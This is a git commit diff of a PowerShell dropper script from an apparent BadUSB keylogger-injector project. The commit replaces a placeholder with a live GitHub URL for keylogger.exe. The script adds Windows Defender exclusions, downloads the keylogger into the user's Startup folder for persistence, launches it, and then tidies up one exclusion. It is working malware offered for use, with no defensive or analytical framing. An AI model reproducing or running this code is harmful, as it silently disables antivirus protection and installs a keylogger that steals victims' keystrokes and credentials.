20a8aacfeb4756983a142e76363ce63161ef1666
veracsz <114325958+veracsz@users.noreply.github.com>
2024-04-05 18:13:42 -0600

    startScript.ps1
    changed website params

--- startScript.ps1
+++ startScript.ps1
@@ -1,6 +1,6 @@
 Set-Location $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup #Go to the folder in which we will donwload files
 Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
-Invoke-WebRequest LINK -O keylogger.exe #Download keylogger script
+Invoke-WebRequest "https://github.com/veracsz/BadUSB_keyloggerInjector/raw/main/keylogger.exe" -O keylogger.exe #Download keylogger script
 Add-MpPreference -ExclusionPath $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup\keylogger.exe -Force #Add exception for keylogger.exe file in antivirus
 Start-Process keylogger.exe #Start keylogger script
 Remove-MpPreference -ExclusionExtension exe -Force #Reser .exe files exception in antivirus
